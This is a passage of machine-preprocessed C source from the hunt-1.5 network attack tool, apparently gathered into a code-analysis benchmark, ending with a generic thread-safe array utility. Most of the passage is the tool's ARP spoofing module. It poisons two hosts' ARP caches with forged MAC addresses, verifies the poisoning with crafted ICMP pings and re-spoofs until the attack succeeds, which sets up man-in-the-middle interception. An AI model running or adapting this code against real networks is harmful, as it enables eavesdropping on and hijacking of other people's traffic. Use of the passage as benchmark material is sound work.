  i = menu_choose_unr((char *)"item nr. to delete", 0, tmp - 1, -1);
  }
#line 1086
  if (i >= 0) {
    {
#line 1087
    tmp___0 = list_at(& l_arp_spoof, i);
#line 1087
    asi = (struct arp_spoof_info *)tmp___0;
#line 1088
    stop_arp_spoof(asi);
    }
  }
#line 1091
  return;
}
}
#line 1093 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arpspoof.c"
static void arp_spoof_range_del(void) 
{ 
  int i ;
  struct arp_spoof_range *asr ;
  int tmp ;
  void *tmp___0 ;

  {
  {
#line 1098
  arp_spoof_range_list();
#line 1099
  tmp = list_count(& l_arp_spoof_range);
#line 1099
  i = menu_choose_unr((char *)"item nr. to delete", 0, tmp - 1, -1);
  }
#line 1101
  if (i >= 0) {
    {
#line 1102
    tmp___0 = list_at(& l_arp_spoof_range, i);
#line 1102
    asr = (struct arp_spoof_range *)tmp___0;
#line 1103
    stop_arp_spoof_range(asr);
#line 1104
    list_remove(& l_arp_spoof_range, (void *)asr);
#line 1105
    free((void *)asr);
    }
  }
#line 1107
  return;
}
}
#line 1109 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arpspoof.c"
static void arp_spoof_add_h(void) 
{ 
  unsigned int src_ip ;
  unsigned int dst_ip ;
  struct arp_spoof_info *asi_src_in_dst ;
  struct arp_spoof_info *asi_dst_in_src ;
  unsigned char src_fake_mac[6] ;
  unsigned char dst_fake_mac[6] ;
  char buf[512] ;
  struct mac_info *mi_src ;
  struct mac_info *mi_dst ;
  int refresh ;
  int src_can_forward ;
  int dst_can_forward ;
  unsigned char *tmp ;
  int tmp___0 ;
  unsigned char *tmp___1 ;
  int tmp___2 ;
  int tmp___3 ;
  int tmp___4 ;

  {
  {
#line 1117
  src_fake_mac[0] = (unsigned char)0;
#line 1117
  src_fake_mac[1] = (unsigned char)96;
#line 1117
  src_fake_mac[2] = (unsigned char)8;
#line 1117
  src_fake_mac[3] = (unsigned char)190;
#line 1117
  src_fake_mac[4] = (unsigned char)145;
#line 1117
  src_fake_mac[5] = (unsigned char)239;
#line 1118
  dst_fake_mac[0] = (unsigned char)0;
#line 1118
  dst_fake_mac[1] = (unsigned char)96;
#line 1118
  dst_fake_mac[2] = (unsigned char)8;
#line 1118
  dst_fake_mac[3] = (unsigned char)190;
#line 1118
  dst_fake_mac[4] = (unsigned char)145;
#line 1118
  dst_fake_mac[5] = (unsigned char)238;
#line 1123
  src_ip = menu_choose_hostname((char *)"src/dst host1 to arp spoof", (char *)((void *)0));
  }
#line 1123
  if (src_ip == 4294967295U) {
#line 1124
    return;
  }
  {
#line 1125
  tmp = suggest_mac();
#line 1125
  sprintf_eth_mac(buf, tmp);
#line 1126
  tmp___0 = menu_choose_mac((char *)"host1 fake mac", src_fake_mac, buf);
  }
#line 1126
  if (tmp___0 < 0) {
#line 1127
    return;
  }
#line 1128
  if (can_forward_question) {
    {
#line 1129
    src_can_forward = menu_choose_yn((char *)"is host IP router y/n", 0);
    }
#line 1129
    if (src_can_forward < 0) {
#line 1130
      return;
    }
  } else {
#line 1132
    src_can_forward = 1;
  }
  {
#line 1133
  dst_ip = menu_choose_hostname((char *)"src/dst host2 to arp spoof", (char *)((void *)0));
  }
#line 1133
  if (dst_ip == 4294967295U) {
#line 1134
    return;
  }
  {
#line 1135
  tmp___1 = suggest_mac();
#line 1135
  sprintf_eth_mac(buf, tmp___1);
#line 1136
  tmp___2 = menu_choose_mac((char *)"host2 fake mac", dst_fake_mac, buf);
  }
#line 1136
  if (tmp___2 < 0) {
#line 1137
    return;
  }
#line 1138
  if (can_forward_question) {
    {
#line 1139
    dst_can_forward = menu_choose_yn((char *)"is host IP router y/n", 0);
    }
#line 1139
    if (dst_can_forward < 0) {
#line 1140
      return;
    }
  } else {
#line 1142
    dst_can_forward = 1;
  }
  {
#line 1143
  refresh = menu_choose_unr((char *)"refresh interval sec", 0, 100000, 0);
  }
#line 1143
  if (refresh < 0) {
#line 1144
    return;
  }
  {
#line 1146
  mi_src = mac_info_get(src_ip);
  }
#line 1146
  if (! mi_src) {
    {
#line 1147
    mac_discover(src_ip, 2);
#line 1148
    sec_nanosleep(1);
#line 1149
    mi_src = mac_info_get(src_ip);
    }
#line 1149
    if (! mi_src) {
      {
#line 1150
      printf((char const   */* __restrict  */)"ERR: host1 mac isn\'t known\n");
      }
#line 1151
      return;
    }
  }
  {
#line 1154
  mi_dst = mac_info_get(dst_ip);
  }
#line 1154
  if (! mi_dst) {
    {
#line 1155
    mac_discover(dst_ip, 2);
#line 1156
    sec_nanosleep(1);
#line 1157
    mi_dst = mac_info_get(dst_ip);
    }
#line 1157
    if (! mi_dst) {
      {
#line 1158
      mac_info_release(mi_src);
#line 1159
      printf((char const   */* __restrict  */)"ERR: host2 mac isn\'t known\n");
      }
#line 1160
      return;
    }
  }
  {
#line 1163
  asi_src_in_dst = start_arp_spoof(src_ip, dst_ip, mi_src->mac, mi_dst->mac, (char *)(src_fake_mac),
                                   refresh, src_can_forward, 0);
#line 1165
  asi_dst_in_src = start_arp_spoof(dst_ip, src_ip, mi_dst->mac, mi_src->mac, (char *)(dst_fake_mac),
                                   refresh, dst_can_forward, 0);
#line 1167
  mac_info_release(mi_src);
#line 1168
  mac_info_release(mi_dst);
#line 1169
  tmp___3 = user_arpspoof_test(asi_src_in_dst);
  }
#line 1169
  if (tmp___3) {
    {
#line 1170
    user_run_arpspoof_until_successed(asi_src_in_dst);
    }
  }
  {
#line 1171
  tmp___4 = user_arpspoof_test(asi_dst_in_src);
  }
#line 1171
  if (tmp___4) {
    {
#line 1172
    user_run_arpspoof_until_successed(asi_dst_in_src);
    }
  }
#line 1173
  return;
}
}
#line 1175 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arpspoof.c"
static void arp_spoof_del_h(void) 
{ 
  struct arp_spoof_info *asi ;
  unsigned int ip1 ;
  unsigned int ip2 ;
  struct list_iterator li ;
  int i ;
  int tmp ;
  void *tmp___0 ;
  void *tmp___1 ;

  {
  {
#line 1182
  arp_spoof_list_items();
#line 1183
  tmp = arp_spoof_count();
#line 1183
  i = menu_choose_unr((char *)"item nr. with src/dst or [cr]", 0, tmp - 1, -1);
  }
#line 1185
  if (i < 0) {
    {
#line 1186
    ip1 = menu_choose_hostname((char *)"src/dst host1 to remove", (char *)((void *)0));
    }
#line 1186
    if (ip1 == 4294967295U) {
#line 1187
      return;
    }
    {
#line 1188
    ip2 = menu_choose_hostname((char *)"src/dst host2 to remove", (char *)((void *)0));
    }
#line 1188
    if (ip2 == 4294967295U) {
#line 1189
      return;
    }
  } else {
    {
#line 1191
    tmp___0 = list_at(& l_arp_spoof, i);
#line 1191
    asi = (struct arp_spoof_info *)tmp___0;
#line 1192
    ip1 = asi->src_addr;
#line 1193
    ip2 = asi->dst_addr;
    }
  }
  {
#line 1195
  list_iter_set(& li, & l_arp_spoof);
  }
  {
#line 1196
  while (1) {
    while_continue: /* CIL Label */ ;
    {
#line 1196
    tmp___1 = list_iter_get(& li);
#line 1196
    asi = (struct arp_spoof_info *)tmp___1;
    }
#line 1196
    if (! asi) {
#line 1196
      goto while_break;
    }
#line 1197
    if (asi->src_addr == ip1) {
#line 1197
      if (asi->dst_addr == ip2) {
        {
#line 1198
        stop_arp_spoof(asi);
        }
      }
    }
#line 1199
    if (asi->dst_addr == ip1) {
#line 1199
      if (asi->src_addr == ip2) {
        {
#line 1200
        stop_arp_spoof(asi);
        }
      }
    }
  }
  while_break: /* CIL Label */ ;
  }
  {
#line 1202
  list_iter_end(& li);
  }
#line 1203
  return;
}
}
#line 1205 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arpspoof.c"
static void do_test_or_refresh(struct arp_spoof_info *asi ) 
{ 
  int retval ;
  int refresh ;
  char *tmp ;
  int tmp___0 ;

  {
#line 1209
  refresh = 0;
  {
#line 1210
  while (1) {
    while_continue: /* CIL Label */ ;
    {
#line 1211
    retval = user_arpspoof_test(asi);
    }
#line 1211
    if (retval == 0) {
      {
#line 1213
      tmp = host_lookup(asi->dst_addr, hl_mode);
#line 1213
      printf((char const   */* __restrict  */)"ARP spoof in host %s - OK\n", tmp);
#line 1214
      refresh = 0;
      }
    } else
#line 1215
    if (retval != -2) {
      {
#line 1216
      tmp___0 = menu_choose_char((char *)"do you want to refresh ARP spoof? y/n",
                                 (char *)"yn", (char )'y');
      }
      {
#line 1217
      if (tmp___0 == 121) {
#line 1217
        goto case_121;
      }
#line 1222
      goto switch_default;
      case_121: /* CIL Label */ 
      {
#line 1218
      refresh = 1;
#line 1219
      send_src_spoof_to_dst(asi);
      }
#line 1220
      goto switch_break;
      switch_default: /* CIL Label */ 
#line 1223
      refresh = 0;
#line 1224
      goto switch_break;
      switch_break: /* CIL Label */ ;
      }
    } else {
#line 1227
      refresh = 0;
    }
#line 1210
    if (! (refresh == 1)) {
#line 1210
      goto while_break;
    }
  }
  while_break: /* CIL Label */ ;
  }
#line 1229
  return;
}
}
#line 1231 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arpspoof.c"
static void arp_spoof_user_test(void) 
{ 
  int i ;
  struct arp_spoof_info *asi ;
  int tmp ;
  void *tmp___0 ;

  {
  {
#line 1236
  arp_spoof_list_items();
#line 1237
  tmp = arp_spoof_count();
#line 1237
  i = menu_choose_unr((char *)"item nr. to test", 0, tmp - 1, -1);
  }
#line 1238
  if (i < 0) {
#line 1239
    return;
  }
  {
#line 1240
  tmp___0 = list_at(& l_arp_spoof, i);
#line 1240
  asi = (struct arp_spoof_info *)tmp___0;
#line 1241
  do_test_or_refresh(asi);
  }
#line 1242
  return;
}
}
#line 1244 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arpspoof.c"
static void arp_spoof_range_user_test(void) 
{ 
  struct arp_spoof_range *asr ;
  unsigned int dst_addr ;
  int i ;
  int range_test ;
  int tmp ;
  void *tmp___0 ;

  {
  {
#line 1250
  arp_spoof_range_list();
#line 1251
  tmp = list_count(& l_arp_spoof_range);
#line 1251
  i = menu_choose_unr((char *)"item nr. to test", 0, tmp - 1, -1);
  }
#line 1252
  if (i < 0) {
#line 1253
    return;
  }
  {
#line 1254
  tmp___0 = list_at(& l_arp_spoof_range, i);
#line 1254
  asr = (struct arp_spoof_range *)tmp___0;
#line 1255
  range_test = menu_choose_yn((char *)"whole range test y/n", 0);
  }
#line 1255
  if (range_test < 0) {
#line 1256
    return;
  }
#line 1257
  if (range_test) {
#line 1258
    dst_addr = 4294967295U;
  } else {
    {
#line 1260
    dst_addr = menu_choose_hostname((char *)"host to test", (char *)((void *)0));
    }
#line 1260
    if (dst_addr == 4294967295U) {
#line 1261
      return;
    }
  }
#line 1262
  i = 0;
  {
#line 1262
  while (1) {
    while_continue: /* CIL Label */ ;
#line 1262
    if (! (i < asr->asi_count)) {
#line 1262
      goto while_break;
    }
#line 1263
    if (dst_addr == 4294967295U) {
#line 1263
      if ((*(asr->asi + i))->dst_mac_valid) {
        {
#line 1264
        do_test_or_refresh(*(asr->asi + i));
        }
      } else {
#line 1263
        goto _L;
      }
    } else
    _L: /* CIL Label */ 
#line 1265
    if ((*(asr->asi + i))->dst_addr == dst_addr) {
      {
#line 1266
      do_test_or_refresh(*(asr->asi + i));
      }
#line 1267
      goto while_break;
    }
#line 1262
    i ++;
  }
  while_break: /* CIL Label */ ;
  }
#line 1270
  if (dst_addr != 4294967295U) {
#line 1270
    if (i >= asr->asi_count) {
      {
#line 1271
      printf((char const   */* __restrict  */)"host not found in range database\n");
      }
    }
  }
#line 1272
  return;
}
}
#line 1274 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arpspoof.c"
void arpspoof_menu(void) 
{ 
  char *r_menu ;
  char *r_keys ;
  int run_it ;
  int tmp ;

  {
#line 1276
  r_menu = (char *)"s/k) start/stop relayer daemon\nl/L) list arp spoof database\na)   add host to host arp spoof     i/I) insert single/range arp spoof\nd)   delete host to host arp spoof  r/R) remove single/range arp spoof\nt/T) test if arp spoof successed    y) relay database\nx)   return\n";
#line 1282
  r_keys = (char *)"sklLadiIrRmtTyx";
#line 1285
  run_it = 1;
  {
#line 1286
  while (1) {
    while_continue: /* CIL Label */ ;
#line 1286
    if (! run_it) {
#line 1286
      goto while_break;
    }
    {
#line 1287
    tmp = menu((char *)"arpspoof daemon", r_menu, (char *)"arps", r_keys, (char)0);
    }
    {
#line 1288
    if (tmp == 115) {
#line 1288
      goto case_115;
    }
#line 1291
    if (tmp == 107) {
#line 1291
      goto case_107;
    }
#line 1294
    if (tmp == 108) {
#line 1294
      goto case_108;
    }
#line 1297
    if (tmp == 76) {
#line 1297
      goto case_76;
    }
#line 1300
    if (tmp == 97) {
#line 1300
      goto case_97;
    }
#line 1303
    if (tmp == 100) {
#line 1303
      goto case_100;
    }
#line 1306
    if (tmp == 105) {
#line 1306
      goto case_105;
    }
#line 1309
    if (tmp == 73) {
#line 1309
      goto case_73;
    }
#line 1312
    if (tmp == 114) {
#line 1312
      goto case_114;
    }
#line 1315
    if (tmp == 82) {
#line 1315
      goto case_82;
    }
#line 1318
    if (tmp == 116) {
#line 1318
      goto case_116;
    }
#line 1321
    if (tmp == 84) {
#line 1321
      goto case_84;
    }
#line 1324
    if (tmp == 121) {
#line 1324
      goto case_121;
    }
#line 1327
    if (tmp == 120) {
#line 1327
      goto case_120;
    }
#line 1287
    goto switch_break;
    case_115: /* CIL Label */ 
    {
#line 1289
    start_arp_relayer();
    }
#line 1290
    goto switch_break;
    case_107: /* CIL Label */ 
    {
#line 1292
    stop_arp_relayer();
    }
#line 1293
    goto switch_break;
    case_108: /* CIL Label */ 
    {
#line 1295
    arp_spoof_list_items();
    }
#line 1296
    goto switch_break;
    case_76: /* CIL Label */ 
    {
#line 1298
    arp_spoof_range_list();
    }
#line 1299
    goto switch_break;
    case_97: /* CIL Label */ 
    {
#line 1301
    arp_spoof_add_h();
    }
#line 1302
    goto switch_break;
    case_100: /* CIL Label */ 
    {
#line 1304
    arp_spoof_del_h();
    }
#line 1305
    goto switch_break;
    case_105: /* CIL Label */ 
    {
#line 1307
    arp_spoof_add_item();
    }
#line 1308
    goto switch_break;
    case_73: /* CIL Label */ 
    {
#line 1310
    arp_spoof_range_add();
    }
#line 1311
    goto switch_break;
    case_114: /* CIL Label */ 
    {
#line 1313
    arp_spoof_del_item();
    }
#line 1314
    goto switch_break;
    case_82: /* CIL Label */ 
    {
#line 1316
    arp_spoof_range_del();
    }
#line 1317
    goto switch_break;
    case_116: /* CIL Label */ 
    {
#line 1319
    arp_spoof_user_test();
    }
#line 1320
    goto switch_break;
    case_84: /* CIL Label */ 
    {
#line 1322
    arp_spoof_range_user_test();
    }
#line 1323
    goto switch_break;
    case_121: /* CIL Label */ 
    {
#line 1325
    relay_menu();
    }
#line 1326
    goto switch_break;
    case_120: /* CIL Label */ 
#line 1328
    run_it = 0;
#line 1329
    goto switch_break;
    switch_break: /* CIL Label */ ;
    }
  }
  while_break: /* CIL Label */ ;
  }
#line 1332
  return;
}
}
#line 1334 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arpspoof.c"
static struct list l_arpspoof_test  = 
#line 1334
     {(void *)0, (void *)0, (int )((char *)(& ((struct packet *)0)->p_next[6]) - (char *)0),
    0, (struct list_iterator *)((void *)0), 0, {{0, 0U, 0, 0U, 0, (short)0, (short)0,
                                                 {(struct __pthread_internal_list *)0,
                                                  (struct __pthread_internal_list *)0}}},
    {{0, 0U, 0ULL, 0ULL, 0ULL, (void *)0, 0U, 0U}}, (pthread_t )0};
#line 1339 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arpspoof.c"
static void hunt_arpspoof_test(struct packet *p , void *arg ) 
{ 
  struct arp_spoof_info *asi ;
  struct iphdr *iph ;
  struct icmphdr *icmph ;

  {
#line 1341
  asi = (struct arp_spoof_info *)arg;
#line 1342
  iph = p->p_iph;
#line 1343
  icmph = p->p_hdr.p_icmph;
#line 1345
  if (iph->saddr == asi->dst_addr) {
#line 1345
    if (iph->daddr == asi->src_addr) {
#line 1345
      if ((int )icmph->type == 0) {
#line 1345
        if ((int )icmph->code == 0) {
          {
#line 1348
          packet_want(p);
#line 1349
          list_produce(& l_arpspoof_test, (void *)p);
          }
        }
      }
    }
  }
#line 1351
  return;
}
}
#line 1353 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arpspoof.c"
static int find_asi_dst_mac(struct arp_spoof_info *asi , char *error_label ) 
{ 
  struct mac_info *mi_dst ;

  {
#line 1357
  if (! asi->dst_mac_valid) {
    {
#line 1358
    mac_discover(asi->dst_addr, 2);
#line 1359
    sec_nanosleep(1);
#line 1360
    mi_dst = mac_info_get(asi->dst_addr);
    }
#line 1360
    if (! mi_dst) {
#line 1361
      if (error_label) {
        {
#line 1362
        printf((char const   */* __restrict  */)"%s", error_label);
        }
      }
#line 1363
      return (-2);
    }
    {
#line 1365
    memcpy((void */* __restrict  */)(asi->dst_mac), (void const   */* __restrict  */)(mi_dst->mac),
           (size_t )6);
#line 1366
    asi->dst_mac_valid = 1;
#line 1367
    mac_info_release(mi_dst);
    }
  }
#line 1369
  return (0);
}
}
#line 1372 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arpspoof.c"
int arpspoof_test(struct arp_spoof_info *asi ) 
{ 
  struct timeval tv ;
  struct timespec timeout ;
  struct ifunc_item ifunc_pingtest ;
  struct packet *p ;
  int retval ;
  int i ;
  void *tmp ;

  {
#line 1381
  if (! asi->dst_mac_valid) {
    {
#line 1382
    fprintf((FILE */* __restrict  */)stderr, (char const   */* __restrict  */)"error: try to do arpspoof_test without known dst mac\n");
    }
#line 1383
    return (-1);
  }
  {
#line 1385
  ifunc_pingtest.func = & hunt_arpspoof_test;
#line 1386
  ifunc_pingtest.arg = (void *)asi;
#line 1387
  list_enqueue(& l_ifunc_icmp, (void *)(& ifunc_pingtest));
#line 1389
  i = 0;
#line 1389
  retval = 0;
  }
  {
#line 1389
  while (1) {
    while_continue: /* CIL Label */ ;
#line 1389
    if (i < 3) {
#line 1389
      if (! (! retval)) {
#line 1389
        goto while_break;
      }
    } else {
#line 1389
      goto while_break;
    }
    {
#line 1390
    send_icmp_request(asi->src_addr, asi->dst_addr, (char *)(asi->src_fake_mac), (char *)(asi->dst_mac),
                      (unsigned short )(1 + i));
#line 1392
    gettimeofday((struct timeval */* __restrict  */)(& tv), (__timezone_ptr_t )((void *)0));
#line 1393
    timeout.tv_sec = tv.tv_sec + 1L;
#line 1394
    timeout.tv_nsec = tv.tv_usec * 1000L;
    }
    {
#line 1395
    while (1) {
      while_continue___0: /* CIL Label */ ;
      {
#line 1395
      tmp = list_consume(& l_arpspoof_test, (struct timespec  const  *)(& timeout));
#line 1395
      p = (struct packet *)tmp;
      }
#line 1395
      if (! p) {
#line 1395
        goto while_break___0;
      }
      {
#line 1396
      retval = is_icmp_reply(p, asi->dst_addr, asi->src_addr, (char *)(asi->dst_mac),
                             (char *)(asi->src_fake_mac));
#line 1398
      packet_free(p);
      }
#line 1399
      if (retval) {
#line 1400
        goto while_break___0;
      }
    }
    while_break___0: /* CIL Label */ ;
    }
#line 1389
    i ++;
  }
  while_break: /* CIL Label */ ;
  }
  {
#line 1403
  list_remove(& l_ifunc_icmp, (void *)(& ifunc_pingtest));
#line 1404
  packet_flush(& l_arpspoof_test);
  }
#line 1406
  if (retval == 1) {
#line 1407
    return (0);
  } else
#line 1408
  if (retval == 2) {
#line 1409
    return (-1);
  }
#line 1411
  return (-1);
}
}
#line 1414 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arpspoof.c"
int user_arpspoof_test(struct arp_spoof_info *asi ) 
{ 
  char mac_buf[64] ;
  int retval ;
  int tmp ;
  char *tmp___0 ;
  char *tmp___1 ;

  {
  {
#line 1419
  retval = find_asi_dst_mac(asi, (char *)"dst mac isn\'t known - cannot do test\n");
  }
#line 1419
  if (retval < 0) {
#line 1420
    return (retval);
  }
  {
#line 1421
  tmp = arpspoof_test(asi);
  }
#line 1421
  if (tmp == 0) {
#line 1422
    return (0);
  }
  {
#line 1423
  sprintf_eth_mac(mac_buf, asi->src_fake_mac);
#line 1424
  set_tty_color((enum TTY_COLOR )9);
#line 1425
  tmp___0 = host_lookup(asi->dst_addr, hl_mode);
#line 1425
  tmp___1 = host_lookup(asi->src_addr, hl_mode);
#line 1425
  printf((char const   */* __restrict  */)"ARP spoof of %s with fake mac %s in host %s FAILED\n",
         tmp___1, mac_buf, tmp___0);
#line 1429
  set_tty_color((enum TTY_COLOR )7);
#line 1430
  fflush(stdout);
  }
#line 1431
  return (-1);
}
}
#line 1434 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arpspoof.c"
static int volatile   run_arpspoof  ;
#line 1436 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arpspoof.c"
static void run_arpspoof_intr(int sig ) 
{ 


  {
#line 1438
  run_arpspoof = (int volatile   )0;
#line 1439
  return;
}
}
#line 1441 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arpspoof.c"
int user_run_arpspoof_until_successed(struct arp_spoof_info *asi ) 
{ 
  int tmp ;
  int tmp___0 ;

  {
  {
#line 1443
  tmp = menu_choose_char((char *)"do you want to force arp spoof until successed y/n",
                         (char *)"yn", (char )'y');
  }
  {
#line 1444
  if (tmp == 121) {
#line 1444
    goto case_121;
  }
#line 1452
  if (tmp == 110) {
#line 1452
    goto case_110;
  }
#line 1443
  goto switch_break;
  case_121: /* CIL Label */ 
  {
#line 1445
  tmp___0 = run_arpspoof_until_successed(asi);
  }
#line 1445
  if (tmp___0 == 0) {
    {
#line 1446
    printf((char const   */* __restrict  */)"ARP spoof successed\n");
    }
#line 1447
    return (0);
  } else {
    {
#line 1449
    printf((char const   */* __restrict  */)"ARP spoof failed\n");
    }
#line 1450
    return (-1);
  }
  case_110: /* CIL Label */ 
#line 1453
  return (-1);
  switch_break: /* CIL Label */ ;
  }
#line 1455
  return (-1);
}
}
#line 1458 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arpspoof.c"
int run_arpspoof_until_successed(struct arp_spoof_info *asi ) 
{ 
  struct sigaction sa ;
  struct sigaction sa_old ;
  struct timespec timeout ;
  int retval ;
  int tmp ;
  int tmp___0 ;

  {
  {
#line 1464
  retval = find_asi_dst_mac(asi, (char *)"dst mac isn\'t known\n");
  }
#line 1464
  if (retval < 0) {
#line 1465
    return (retval);
  }
  {
#line 1466
  printf((char const   */* __restrict  */)"CTRL-C to break\n");
#line 1468
  sa.__sigaction_handler.sa_handler = & run_arpspoof_intr;
#line 1469
  sigemptyset(& sa.sa_mask);
#line 1470
  sa.sa_flags = 268435456;
#line 1471
  sigaction(2, (struct sigaction  const  */* __restrict  */)(& sa), (struct sigaction */* __restrict  */)(& sa_old));
#line 1472
  pthread_sigmask(0, (__sigset_t const   */* __restrict  */)(& intr_mask), (__sigset_t */* __restrict  */)((void *)0));
#line 1474
  run_arpspoof = (int volatile   )1;
  }
  {
#line 1475
  while (1) {
    while_continue: /* CIL Label */ ;
    {
#line 1475
    tmp = arpspoof_test(asi);
    }
#line 1475
    if (tmp != 0) {
#line 1475
      if (! run_arpspoof) {
#line 1475
        goto while_break;
      }
    } else {
#line 1475
      goto while_break;
    }
    {
#line 1476
    printf((char const   */* __restrict  */)".");
#line 1477
    fflush(stdout);
#line 1478
    force_arp_spoof(asi, 4);
#line 1479
    pthread_sigmask(1, (__sigset_t const   */* __restrict  */)(& intr_mask), (__sigset_t */* __restrict  */)((void *)0));
#line 1480
    timeout.tv_sec = (__time_t )5;
#line 1481
    timeout.tv_nsec = (__syscall_slong_t )0;
#line 1482
    nanosleep((struct timespec  const  *)(& timeout), (struct timespec *)((void *)0));
#line 1483
    pthread_sigmask(0, (__sigset_t const   */* __restrict  */)(& intr_mask), (__sigset_t */* __restrict  */)((void *)0));
    }
  }
  while_break: /* CIL Label */ ;
  }
#line 1485
  if (! run_arpspoof) {
    {
#line 1486
    press_key((char *)"\n-- operation canceled - press any key> ");
    }
  }
  {
#line 1487
  pthread_sigmask(1, (__sigset_t const   */* __restrict  */)(& intr_mask), (__sigset_t */* __restrict  */)((void *)0));
#line 1488
  sigaction(2, (struct sigaction  const  */* __restrict  */)(& sa_old), (struct sigaction */* __restrict  */)((void *)0));
#line 1489
  tmp___0 = arpspoof_test(asi);
  }
#line 1489
  return (tmp___0);
}
}
#line 1492 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arpspoof.c"
int arpspoof_exit_check(void) 
{ 
  int tmp ;

  {
  {
#line 1494
  tmp = list_count(& l_arp_spoof);
  }
#line 1494
  if (tmp > 0) {
    {
#line 1495
    set_tty_color((enum TTY_COLOR )9);
#line 1496
    printf((char const   */* __restrict  */)"there are arp spoofed addresses left in arpspoof daemon\n");
#line 1497
    set_tty_color((enum TTY_COLOR )7);
    }
  }
#line 1499
  return (0);
}
}
#line 480 "/usr/include/stdlib.h"
extern  __attribute__((__nothrow__)) void *( __attribute__((__warn_unused_result__,
__leaf__)) realloc)(void *__ptr , size_t __size ) ;
#line 33 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/array.h"
void array_init(struct array *a , int size ) ;
#line 34
void array_free(struct array *a ) ;
#line 36
void *array_at(struct array *a , int nr ) ;
#line 37
void *array_remove(struct array *a , void *m ) ;
#line 38
void *array_remove_at(struct array *a , int nr ) ;
#line 40
int array_put(struct array *a , void *m ) ;
#line 41
void *array_put_at(struct array *a , int nr , void *m ) ;
#line 43
void *array_pop(struct array *a ) ;
#line 45
int array_count(struct array *a ) ;
#line 52
void array_iter_set(struct array_iterator *ai , struct array *a ) ;
#line 53
void *array_iter_get(struct array_iterator *ai ) ;
#line 54
void array_iter_end(struct array_iterator *ai ) ;
#line 56
void array_iter_lock(struct array_iterator *ai ) ;
#line 57
void array_iter_unlock(struct array_iterator *ai ) ;
#line 14 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/array.c"
__inline static void update_a_items(struct array *a , int nr , void *m ) 
{ 


  {
#line 16
  if ((a->a_arr + nr)->ai_data) {
#line 17
    if (! m) {
#line 18
      (a->a_items) --;
    }
  } else
#line 20
  if (m) {
#line 21
    (a->a_items) ++;
  }
#line 23
  return;
}
}
#line 25 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/array.c"
void array_init(struct array *a , int size ) 
{ 
  struct array_item *tmp ;
  void *tmp___0 ;

  {
  {
#line 27
  tmp___0 = malloc((unsigned long )size * sizeof(struct array_item ));
#line 27
  tmp = (struct array_item *)tmp___0;
#line 27
  a->a_arr = tmp;
  }
#line 27
  if (! tmp) {
    {
#line 27
    __assert_fail("a->a_arr = malloc(size * sizeof(struct array_item))", "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/array.c",
                  27U, "array_init");
    }
  }
  {
#line 28
  memset((void *)a->a_arr, 0, (unsigned long )size * sizeof(struct array_item ));
#line 29
  a->a_size = size;
#line 30
  a->a_items = 0;
#line 32
  a->a_locked = 0;
#line 33
  pthread_mutex_init(& a->a_mutex, (pthread_mutexattr_t const   *)((void *)0));
  }
#line 35
  return;
}
}
#line 37 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/array.c"
__inline static void __lock(struct array *a ) 
{ 
  pthread_t tmp ;

  {
#line 40
  if (! a->a_locked) {
    {
#line 41
    pthread_mutex_lock(& a->a_mutex);
    }
  } else {
    {
#line 40
    tmp = pthread_self();
    }
#line 40
    if (a->a_locked_thr != tmp) {
      {
#line 41
      pthread_mutex_lock(& a->a_mutex);
      }
    }
  }
#line 43
  return;
}
}
#line 45 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/array.c"
__inline static void __unlock(struct array *a ) 
{ 
  pthread_t tmp ;

  {
#line 48
  if (! a->a_locked) {
    {
#line 49
    pthread_mutex_unlock(& a->a_mutex);
    }
  } else {
    {
#line 48
    tmp = pthread_self();
    }
#line 48
    if (a->a_locked_thr != tmp) {
      {
#line 49
      pthread_mutex_unlock(& a->a_mutex);
      }
    }
  }
#line 51
  return;
}
}
#line 53 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/array.c"
void array_free(struct array *a ) 
{ 


  {
  {
#line 55
  __lock(a);
  }
#line 56
  if (a->a_arr) {
    {
#line 57
    free((void *)a->a_arr);
    }
  }
  {
#line 58
  a->a_arr = (struct array_item *)((void *)0);
#line 59
  a->a_size = 0;
#line 60
  a->a_items = 0;
#line 61
  __unlock(a);
  }
#line 62
  return;
}
}
#line 64 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/array.c"
void *array_at(struct array *a , int nr ) 
{ 
  void *retval ;

  {
  {
#line 68
  __lock(a);
  }
#line 69
  if (nr < 0) {
#line 70
    retval = (void *)0;
  } else
#line 69
  if (nr >= a->a_size) {
#line 70
    retval = (void *)0;
  } else {
#line 72
    retval = (a->a_arr + nr)->ai_data;
  }
  {
#line 73
  __unlock(a);
  }
#line 74
  return (retval);
}
}
#line 77 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/array.c"
void *array_remove_at(struct array *a , int nr ) 
{ 
  void *tmp ;

  {
  {
#line 79
  tmp = array_put_at(a, nr, (void *)0);
  }
#line 79
  return (tmp);
}
}
#line 82 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/array.c"
void *array_put_at(struct array *a , int nr , void *m ) 
{ 
  void *retval ;

  {
  {
#line 86
  __lock(a);
  }
#line 87
  if (nr < 0) {
#line 88
    retval = (void *)0;
  } else
#line 87
  if (nr >= a->a_size) {
#line 88
    retval = (void *)0;
  } else {
    {
#line 90
    update_a_items(a, nr, m);
#line 91
    retval = (a->a_arr + nr)->ai_data;
#line 92
    (a->a_arr + nr)->ai_data = m;
    }
  }
  {
#line 94
  __unlock(a);
  }
#line 95
  return (retval);
}
}
